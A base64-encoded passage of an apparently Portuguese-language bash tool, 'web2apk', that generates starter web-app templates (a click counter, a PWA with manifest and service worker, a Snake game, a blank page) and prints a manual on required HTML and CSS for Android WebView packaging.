Zyk7CiAgY29sb3I6IHZhcigtLXRleHQpOwogIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIHNhbnMtc2VyaWY7CiAgbWluLWhlaWdodDogMTAwdmg7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwp9CmhlYWRlciB7CiAgYmFja2dyb3VuZDogdmFyKC0tc3VyZmFjZSk7CiAgcGFkZGluZzogMThweCAyMHB4OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBib3JkZXItYm90dG9tOiAxcHggc29saWQgIzJhMmQzYTsKfQpoZWFkZXIgaDEgeyBmb250LXNpemU6IDEuNHJlbTsgY29sb3I6IHZhcigtLWFjY2VudCk7IH0KbWFpbiB7CiAgZmxleDogMTsKICBwYWRkaW5nOiAyMHB4OwogIGRpc3BsYXk6IGZsZXg7CiAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICBnYXA6IDE2cHg7CiAgbWF4LXdpZHRoOiA1MDBweDsKICBtYXJnaW46IDAgYXV0bzsKICB3aWR0aDogMTAwJTsKfQouY2FyZCB7CiAgYmFja2dyb3VuZDogdmFyKC0tc3VyZmFjZSk7CiAgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzKTsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogMXB4IHNvbGlkICMyYTJkM2E7Cn0KLmNhcmQgcCB7IGNvbG9yOiB2YXIoLS1tdXRlZCk7IGxpbmUtaGVpZ2h0OiAxLjY7IG1hcmdpbi1ib3R0b206IDEwcHg7IH0KLmNhcmQgcDpsYXN0LWNoaWxkIHsgbWFyZ2luLWJvdHRvbTogMDsgfQpzcGFuI2NvdW50IHsgY29sb3I6IHZhcigtLWFjY2VudCk7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CmJ1dHRvbiB7CiAgbWFyZ2luLXRvcDogMTJweDsKICBiYWNrZ3JvdW5kOiB2YXIoLS1hY2NlbnQpOwogIGNvbG9yOiAjZmZmOwogIGJvcmRlcjogbm9uZTsKICBib3JkZXItcmFkaXVzOiAxMHB4OwogIHBhZGRpbmc6IDEycHggMjhweDsKICBmb250LXNpemU6IDFyZW07CiAgY3Vyc29yOiBwb2ludGVyOwogIHdpZHRoOiAxMDAlOwogIHRyYW5zaXRpb246IG9wYWNpdHkgLjE1czsKfQpidXR0b246YWN0aXZlIHsgb3BhY2l0eTogLjc1OyB9CkNTUwoKICBjYXQgPiAiJEQvc2NyaXB0LmpzIiA8PCAnSlMnCid1c2Ugc3RyaWN0JzsKCmNvbnN0IGJ0biAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2J0bicpOwpjb25zdCBjb3VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb3VudCcpOwpjb25zdCBpbmZvICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbmZvLXRleHQnKTsKbGV0IG4gPSAwOwoKYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gewogIG4rKzsKICBjb3VudC50ZXh0Q29udGVudCA9IG47CiAgY29uc3QgbXNncyA9IFsKICAgICdGdW5jaW9uYW5kbyBubyBBbmRyb2lkISDwn5qAJywKICAgICdXZWJWaWV3IHJvZGFuZG8gbGlzbyDwn46vJywKICAgICd3ZWIyYXBrIG5vIHRyYWJhbGhvISDimqEnLAogICAgJ0FQSyBwcm9udG8gcHJhIGRpc3RyaWJ1aXIg8J+TpicsCiAgICAnVm9jw6ogw6kgZmVyYSEgJyArIG4gKyAnIGNsaXF1ZXMhJwogIF07CiAgaW5mby50ZXh0Q29udGVudCA9IG1zZ3NbTWF0aC5taW4obiAtIDEsIG1zZ3MubGVuZ3RoIC0gMSldOwp9KTsKSlMKfQoKIyDilIDilIAgcHdhIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApfdHBsX3B3YSgpIHsKICBsb2NhbCBEPSIkMSIKICAjIFJlYXByb3ZlaXRhIG8gdmlzdWFsIGRvIGJhc2ljIGUgYWRpY2lvbmEgbWFuaWZlc3QgKyBzdwogIF90cGxfYmFzaWMgIiREIgoKICAjIFNvYnJlc2NyZXZlIG8gPGhlYWQ+IGRvIGluZGV4Lmh0bWwgcGFyYSBhZGljaW9uYXIgbWFuaWZlc3QKICBzZWQgLWkgJ3N8PHRpdGxlPk1ldSBBcHA8L3RpdGxlPnw8dGl0bGU+TWV1IFBXQTwvdGl0bGU+XG4gIDxsaW5rIHJlbD0ibWFuaWZlc3QiIGhyZWY9Im1hbmlmZXN0Lmpzb24iPlxuICA8bWV0YSBuYW1lPSJ0aGVtZS1jb2xvciIgY29udGVudD0iIzFhNzNlOCI+fCcgIiREL2luZGV4Lmh0bWwiCiAgc2VkIC1pICdzfDxoMSBpZD0iYXBwLXRpdGxlIj5NZXUgQXBwPC9oMT58PGgxIGlkPSJhcHAtdGl0bGUiPk1ldSBQV0E8L2gxPnwnICIkRC9pbmRleC5odG1sIgogIHNlZCAtaSAnc3w8L2JvZHk+fCAgPHNjcmlwdD5pZigic2VydmljZVdvcmtlciJpbiBuYXZpZ2F0b3IpbmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoInN3LmpzIik8L3NjcmlwdD5cbjwvYm9keT58JyAiJEQvaW5kZXguaHRtbCIKCiAgY2F0ID4gIiREL21hbmlmZXN0Lmpzb24iIDw8ICdKU09OJwp7CiAgIm5hbWUiOiAiTWV1IFBXQSIsCiAgInNob3J0X25hbWUiOiAiUFdBIiwKICAic3RhcnRfdXJsIjogIi4iLAogICJkaXNwbGF5IjogInN0YW5kYWxvbmUiLAogICJiYWNrZ3JvdW5kX2NvbG9yIjogIiMwZjExMTciLAogICJ0aGVtZV9jb2xvciI6ICIjMWE3M2U4IiwKICAiaWNvbnMiOiBbCiAgICB7ICJzcmMiOiAiaWNvbi0xOTIucG5nIiwgInNpemVzIjogIjE5MngxOTIiLCAidHlwZSI6ICJpbWFnZS9wbmciIH0sCiAgICB7ICJzcmMiOiAiaWNvbi01MTIucG5nIiwgInNpemVzIjogIjUxMng1MTIiLCAidHlwZSI6ICJpbWFnZS9wbmciIH0KICBdCn0KSlNPTgoKICBjYXQgPiAiJEQvc3cuanMiIDw8ICdTVycKY29uc3QgQ0FDSEUgPSAncHdhLXYxJzsKY29uc3QgQVNTRVRTID0gWycvJywgJy9pbmRleC5odG1sJywgJy9zdHlsZS5jc3MnLCAnL3NjcmlwdC5qcycsICcvbWFuaWZlc3QuanNvbiddOwoKc2VsZi5hZGRFdmVudExpc3RlbmVyKCdpbnN0YWxsJywgZSA9PgogIGUud2FpdFVudGlsKGNhY2hlcy5vcGVuKENBQ0hFKS50aGVuKGMgPT4gYy5hZGRBbGwoQVNTRVRTKSkpKTsKCnNlbGYuYWRkRXZlbnRMaXN0ZW5lcignZmV0Y2gnLCBlID0+CiAgZS5yZXNwb25kV2l0aChjYWNoZXMubWF0Y2goZS5yZXF1ZXN0KS50aGVuKHIgPT4gciB8fCBmZXRjaChlLnJlcXVlc3QpKSkpOwpTVwp9CgojIOKUgOKUgCBnYW1lIChTbmFrZSkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACl90cGxfZ2FtZSgpIHsKICBsb2NhbCBEPSIkMSIKICBjYXQgPiAiJEQvaW5kZXguaHRtbCIgPDwgJ0hUTUwnCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJwdC1CUiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyI+CiAgPHRpdGxlPlNuYWtlPC90aXRsZT4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlLmNzcyI+CjwvaGVhZD4KPGJvZHk+CiAgPGgxPvCfkI0gU25ha2U8L2gxPgogIDxjYW52YXMgaWQ9ImMiIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48L2NhbnZhcz4KICA8cCBpZD0ic2NvcmUiPlBvbnRvczogMDwvcD4KICA8ZGl2IGlkPSJkcGFkIj4KICAgIDxidXR0b24gZGF0YS1kPSJVUCI+4payPC9idXR0b24+CiAgICA8ZGl2PgogICAgICA8YnV0dG9uIGRhdGEtZD0iTEVGVCI+4peAPC9idXR0b24+CiAgICAgIDxidXR0b24gZGF0YS1kPSJSSUdIVCI+4pa2PC9idXR0b24+CiAgICA8L2Rpdj4KICAgIDxidXR0b24gZGF0YS1kPSJET1dOIj7ilrw8L2J1dHRvbj4KICA8L2Rpdj4KICA8c2NyaXB0IHNyYz0ic2NyaXB0LmpzIj48L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+CkhUTUwKCiAgY2F0ID4gIiREL3N0eWxlLmNzcyIgPDwgJ0NTUycKKiB7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IG1hcmdpbjogMDsgcGFkZGluZzogMDsgfQpib2R5IHsKICBiYWNrZ3JvdW5kOiAjMGYxMTE3OwogIGNvbG9yOiAjZThlYWYwOwogIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIHNhbnMtc2VyaWY7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgcGFkZGluZzogMjBweCAxMHB4OwogIGdhcDogMTJweDsKICBtaW4taGVpZ2h0OiAxMDB2aDsKfQpoMSB7IGZvbnQtc2l6ZTogMS41cmVtOyBjb2xvcjogIzFhNzNlODsgfQpjYW52YXMgewogIGJvcmRlcjogMnB4IHNvbGlkICMxYTczZTg7CiAgYm9yZGVyLXJhZGl1czogOHB4OwogIHRvdWNoLWFjdGlvbjogbm9uZTsKfQojc2NvcmUgeyBjb2xvcjogIzhhOGZhODsgZm9udC1zaXplOiAxLjFyZW07IH0KI2RwYWQgIHsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiA2cHg7IH0KI2RwYWQgZGl2IHsgZGlzcGxheTogZmxleDsgZ2FwOiA2cHg7IH0KI2RwYWQgYnV0dG9uIHsKICBiYWNrZ3JvdW5kOiAjMWExZDI3OwogIGJvcmRlcjogMXB4IHNvbGlkICMyYTJkM2E7CiAgYm9yZGVyLXJhZGl1czogMTBweDsKICBjb2xvcjogI2U4ZWFmMDsKICBmb250LXNpemU6IDEuNHJlbTsKICB3aWR0aDogNTZweDsgaGVpZ2h0OiA1NnB4OwogIGN1cnNvcjogcG9pbnRlcjsKfQojZHBhZCBidXR0b246YWN0aXZlIHsgYmFja2dyb3VuZDogIzFhNzNlODsgfQpDU1MKCiAgY2F0ID4gIiREL3NjcmlwdC5qcyIgPDwgJ0pTJwondXNlIHN0cmljdCc7CmNvbnN0IGNhbnZhcyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjJyk7CmNvbnN0IGN0eCAgICA9IGNhbnZhcy5nZXRDb250ZXh0KCcyZCcpOwpjb25zdCBTWiA9IDE1LCBDT0xTID0gMjAsIFJPV1MgPSAyMDsKCmxldCBzbmFrZSwgZGlyLCBmb29kLCBzY29yZSwgcnVubmluZywgbG9vcDsKCmZ1bmN0aW9uIGluaXQoKSB7CiAgc25ha2UgICA9IFt7eDo1LCB5OjEwfSx7eDo0LHk6MTB9LHt4OjMseToxMH1dOwogIGRpciAgICAgPSB7eDoxLCB5OjB9OwogIGZvb2QgICAgPSBybmRGb29kKCk7CiAgc2NvcmUgICA9IDA7CiAgcnVubmluZyA9IHRydWU7CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Njb3JlJykudGV4dENvbnRlbnQgPSAnUG9udG9zOiAwJzsKICBjbGVhckludGVydmFsKGxvb3ApOwogIGxvb3AgPSBzZXRJbnRlcnZhbCh0aWNrLCAxMzApOwp9CgpmdW5jdGlvbiBybmRGb29kKCkgewogIHJldHVybiB7IHg6IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpDT0xTKSwgeTogTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKlJPV1MpIH07Cn0KCmZ1bmN0aW9uIHRpY2soKSB7CiAgY29uc3QgaGVhZCA9IHsgeDogc25ha2VbMF0ueCArIGRpci54LCB5OiBzbmFrZVswXS55ICsgZGlyLnkgfTsKICBpZiAoaGVhZC54IDwgMCB8fCBoZWFkLnggPj0gQ09MUyB8fCBoZWFkLnkgPCAwIHx8IGhlYWQueSA+PSBST1dTIHx8CiAgICAgIHNuYWtlLnNvbWUocyA9PiBzLnggPT09IGhlYWQueCAmJiBzLnkgPT09IGhlYWQueSkpIHsKICAgIGNsZWFySW50ZXJ2YWwobG9vcCk7CiAgICBydW5uaW5nID0gZmFsc2U7CiAgICBjdHguZmlsbFN0eWxlID0gJ3JnYmEoMCwwLDAsLjYpJzsKICAgIGN0eC5maWxsUmVjdCgwLDAsMzAwLDMwMCk7CiAgICBjdHguZmlsbFN0eWxlID0gJyNmZmYnOwogICAgY3R4LmZvbnQgPSAnYm9sZCAyNHB4IHN5c3RlbS11aSc7CiAgICBjdHgudGV4dEFsaWduID0gJ2NlbnRlcic7CiAgICBjdHguZmlsbFRleHQoJ0dhbWUgT3ZlcicsIDE1MCwgMTM1KTsKICAgIGN0eC5mb250ID0gJzE2cHggc3lzdGVtLXVpJzsKICAgIGN0eC5maWxsVGV4dCgnVG9xdWUgcGFyYSByZWluaWNpYXInLCAxNTAsIDE2NSk7CiAgICByZXR1cm47CiAgfQogIHNuYWtlLnVuc2hpZnQoaGVhZCk7CiAgaWYgKGhlYWQueCA9PT0gZm9vZC54ICYmIGhlYWQueSA9PT0gZm9vZC55KSB7CiAgICBzY29yZSsrOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Njb3JlJykudGV4dENvbnRlbnQgPSAnUG9udG9zOiAnICsgc2NvcmU7CiAgICBmb29kID0gcm5kRm9vZCgpOwogIH0gZWxzZSB7IHNuYWtlLnBvcCgpOyB9CiAgZHJhdygpOwp9CgpmdW5jdGlvbiBkcmF3KCkgewogIGN0eC5maWxsU3R5bGUgPSAnIzBmMTExNyc7IGN0eC5maWxsUmVjdCgwLDAsMzAwLDMwMCk7CiAgY3R4LmZpbGxTdHlsZSA9ICcjMWE3M2U4JzsKICBzbmFrZS5mb3JFYWNoKChzLGkpID0+IHsKICAgIGN0eC5nbG9iYWxBbHBoYSA9IGkgPT09IDAgPyAxIDogMC43OwogICAgcm91bmRSZWN0KHMueCpTWisxLCBzLnkqU1orMSwgU1otMiwgU1otMiwgMyk7CiAgfSk7CiAgY3R4Lmdsb2JhbEFscGhhID0gMTsKICBjdHguZmlsbFN0eWxlID0gJyNlNTM5MzUnOwogIHJvdW5kUmVjdChmb29kLngqU1orMSwgZm9vZC55KlNaKzEsIFNaLTIsIFNaLTIsIDMpOwp9CgpmdW5jdGlvbiByb3VuZFJlY3QoeCx5LHcsaCxyKSB7CiAgY3R4LmJlZ2luUGF0aCgpOwogIGN0eC5yb3VuZFJlY3QoeCx5LHcsaCxyKTsKICBjdHguZmlsbCgpOwp9Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZSA9PiB7CiAgY29uc3QgbWFwID0ge0Fycm93VXA6e3g6MCx5Oi0xfSxBcnJvd0Rvd246e3g6MCx5OjF9LEFycm93TGVmdDp7eDotMSx5OjB9LEFycm93UmlnaHQ6e3g6MSx5OjB9fTsKICBpZiAobWFwW2Uua2V5XSAmJiAhKG1hcFtlLmtleV0ueD09PS1kaXIueCAmJiBtYXBbZS5rZXldLnk9PT0tZGlyLnkpKSBkaXIgPSBtYXBbZS5rZXldOwp9KTsKCmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNkcGFkIGJ1dHRvbicpLmZvckVhY2goYnRuID0+IHsKICBidG4uYWRkRXZlbnRMaXN0ZW5lcigndG91Y2hzdGFydCcsIGUgPT4gewogICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgaWYgKCFydW5uaW5nKSB7IGluaXQoKTsgcmV0dXJuOyB9CiAgICBjb25zdCBtYXAgPSB7VVA6e3g6MCx5Oi0xfSxET1dOOnt4OjAseToxfSxMRUZUOnt4Oi0xLHk6MH0sUklHSFQ6e3g6MSx5OjB9fTsKICAgIGNvbnN0IGQgPSBtYXBbYnRuLmRhdGFzZXQuZF07CiAgICBpZiAoZCAmJiAhKGQueD09PS1kaXIueCAmJiBkLnk9PT0tZGlyLnkpKSBkaXIgPSBkOwogIH0pOwp9KTsKCmNhbnZhcy5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgaWYgKCFydW5uaW5nKSBpbml0KCk7IH0pOwppbml0KCk7CkpTCn0KCiMg4pSA4pSAIGJsYW5rIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApfdHBsX2JsYW5rKCkgewogIGxvY2FsIEQ9IiQxIgogIGNhdCA+ICIkRC9pbmRleC5odG1sIiA8PCAnSFRNTCcKPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9InB0LUJSIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIj4KICA8dGl0bGU+TWV1IEFwcDwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJzdHlsZS5jc3MiPgo8L2hlYWQ+Cjxib2R5PgoKICA8IS0tIFNldSBjb250ZcO6ZG8gYXF1aSAtLT4KCiAgPHNjcmlwdCBzcmM9InNjcmlwdC5qcyI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgpIVE1MCgogIGNhdCA+ICIkRC9zdHlsZS5jc3MiIDw8ICdDU1MnCi8qIFJlc2V0ICovCiogeyBib3gtc2l6aW5nOiBib3JkZXItYm94OyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7IH0KCmJvZHkgewogIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIHNhbnMtc2VyaWY7CiAgYmFja2dyb3VuZDogI2ZmZmZmZjsKICBjb2xvcjogIzExMTExMTsKICBtaW4taGVpZ2h0OiAxMDB2aDsKfQpDU1MKCiAgcHJpbnRmICcvLyBzY3JpcHQuanNcbiJ1c2Ugc3RyaWN0IjtcblxuLy8gU2V1IGPDs2RpZ28gYXF1aVxuJyA+ICIkRC9zY3JpcHQuanMiCn0KCgpfY21kX21hbigpIHsKICBsb2NhbCBSPSdcMDMzWzE7MzFtJyBHPSdcMDMzWzE7MzJtJyBZPSdcMDMzWzE7MzNtJwogIGxvY2FsIEM9J1wwMzNbMTszNm0nIFc9J1wwMzNbMTszN20nIEQ9J1wwMzNbMDs5MG0nIE49J1wwMzNbMG0nCiAgcHJpbnRmICJcbiR7V33ilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcke059XG4iCiAgcHJpbnRmICIke1d94pWRICAgICAgICB3ZWIyYXBrIOKAlCBNYW51YWw6IE8gcXVlIGNhZGEgYXJxdWl2byBkZXZlIHRlciAgICAgICAgIOKVkSR7Tn1cbiIKICBwcmludGYgIiR7V33ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0ke059XG5cbiIKCiAgcHJpbnRmICIke1l9RVNUUlVUVVJBIE3DjU5JTUEgRE8gUFJPSkVUTyR7Tn1cbiIKICBwcmludGYgIiR7RH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAke059XG4iCiAgcHJpbnRmICIgICR7WX0uL21ldWFwcC8ke059XG4iCiAgcHJpbnRmICIgICR7WX3ilJzilIDilIAgaW5kZXguaHRtbCR7Tn0gICAke0R94oaQIHBvbnRvIGRlIGVudHJhZGEgb2JyaWdhdMOzcmlvJHtOfVxuIgogIHByaW50ZiAiICAke1l94pSc4pSA4pSAIHN0eWxlLmNzcyR7Tn0gICAgJHtEfeKGkCBlc3RpbG9zIG9icmlnYXTDs3Jpb3Mke059XG4iCiAgcHJpbnRmICIgICR7WX3ilJTilIDilIAgc2NyaXB0LmpzJHtOfSAgICAke0R94oaQIGzDs2dpY2Egb2JyaWdhdMOzcmlhJHtOfVxuXG4iCgogICMg4pSA4pSAIGluZGV4Lmh0bWwg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgcHJpbnRmICIke0N94pSB4pSB4pSBICBpbmRleC5odG1sICDilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEke059XG5cbiIKICBwcmludGYgIiAgJHtXfU9CUklHQVTDk1JJTzoke059XG4iCiAgcHJpbnRmICIgICR7R33inJMke059IFByaW1laXJhIGxpbmhhOiAke0R9PCFET0NUWVBFIGh0bWw+JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBObyA8aGVhZD46ICR7RH08bWV0YSBjaGFyc2V0PVwiVVRGLThcIj4ke059XG4iCiAgcHJpbnRmICIgICR7R33inJMke059IE5vIDxoZWFkPjogJHtEfTxtZXRhIG5hbWU9XCJ2aWV3cG9ydFwiIGNvbnRlbnQ9XCJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wXCI+JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBObyA8aGVhZD46ICR7RH08bGluayByZWw9XCJzdHlsZXNoZWV0XCIgaHJlZj1cInN0eWxlLmNzc1wiPiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gQW50ZXMgZGUgPC9ib2R5PjogJHtEfTxzY3JpcHQgc3JjPVwic2NyaXB0LmpzXCI+PC9zY3JpcHQ+JHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31BVEVOw4fDg08g4oCUIHZpZXdwb3J0OiR7Tn1cbiIKICBwcmludGYgIiAgJHtEfVNlbSBlc3NhIHRhZyBvIEFQSyByZW5kZXJpemEgZW0gbW9kbyBkZXNrdG9wIGUgZmljYSBtaW7DunNjdWxvLiR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9QVRFTsOHw4NPIOKAlCBwb3Npw6fDo28gZG8gPHNjcmlwdD46JHtOfVxuIgogIHByaW50ZiAiICAke0R9Q29sb3F1ZSBTRU1QUkUgYW50ZXMgZGUgPC9ib2R5PiwgbnVuY2Egbm8gPGhlYWQ+LiR7Tn1cbiIKICBwcmludGYgIiAgJHtEfVNlIGNvbG9jYXIgbm8gPGhlYWQ+LCBvIEpTIHJvZGEgYW50ZXMgZG9zIGVsZW1lbnRvcyBleGlzdGlyZW0uJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31DQU1JTkhPUyBERSBBUlFVSVZPUzoke059XG4iCiAgcHJpbnRmICIgICR7Un3inJcke059ICR7RH08aW1nIHNyYz1cIi9ob21lL3VzZXIvZm90by5wbmdcIj4gIOKGkCBjYW1pbmhvIGFic29sdXRvLCBOw4NPIGZ1bmNpb25hJHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSAke0R9PGltZyBzcmM9XCJmb3RvLnBuZ1wiPiAgICAgICAgICAgICDihpAgY2FtaW5obyByZWxhdGl2bywgY29ycmV0byR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9RVhFTVBMTyBNw41OSU1PIFbDgUxJRE86JHtOfVxuIgogIHByaW50ZiAiJHtEfSAgPCFET0NUWVBFIGh0bWw+XG4iCiAgcHJpbnRmICIgIDxodG1sIGxhbmc9XCJwdC1CUlwiPlxuIgogIHByaW50ZiAiICA8aGVhZD5cbiIKICBwcmludGYgIiAgICA8bWV0YSBjaGFyc2V0PVwiVVRGLThcIj5cbiIKICBwcmludGYgIiAgICA8bWV0YSBuYW1lPVwidmlld3BvcnRcIiBjb250ZW50PVwid2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMFwiPlxuIgogIHByaW50ZiAiICAgIDx0aXRsZT5NZXUgQXBwPC90aXRsZT5cbiIKICBwcmludGYgIiAgICA8bGluayByZWw9XCJzdHlsZXNoZWV0XCIgaHJlZj1cInN0eWxlLmNzc1wiPlxuIgogIHByaW50ZiAiICA8L2hlYWQ+XG4iCiAgcHJpbnRmICIgIDxib2R5PlxuIgogIHByaW50ZiAiICAgIDxoMT5PbMOhITwvaDE+XG4iCiAgcHJpbnRmICIgICAgPHNjcmlwdCBzcmM9XCJzY3JpcHQuanNcIj48L3NjcmlwdD5cbiIKICBwcmludGYgIiAgPC9ib2R5PlxuIgogIHByaW50ZiAiICA8L2h0bWw+XG4ke059XG4iCgogICMg4pSA4pSAIHN0eWxlLmNzcyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBwcmludGYgIiR7Q33ilIHilIHilIEgIHN0eWxlLmNzcyAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBJHtOfVxuXG4iCiAgcHJpbnRmICIgICR7V31PQlJJR0FUw5NSSU86JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBSZXNldCBkZSBtYXJnZW06ICR7RH0qIHsgbWFyZ2luOiAwOyBwYWRkaW5nOiAwOyBib3gtc2l6aW5nOiBib3JkZXItYm94OyB9JHtOfVxuIgogIHByaW50ZiAiICAke0d94pyTJHtOfSBUYW1hbmhvIGJhc2U6ICR7RH1ib2R5IHsgd2lkdGg6IDEwMHZ3OyBtaW4taGVpZ2h0OiAxMDB2aDsgfSR7Tn1cblxuIgogIHByaW50ZiAiICAke1d9UkVDT01FTkRBRE8gcGFyYSBBbmRyb2lkOiR7Tn1cbiIKICBwcmludGYgIiAgJHtHfeKckyR7Tn0gRm9udGVzIGVtICR7RH1yZW0ke059IG91ICR7RH12dyR7Tn0sIG7Do28gZW0gJHtEfXB4JHtOfSBmaXhvXG4iCiAgcHJpbn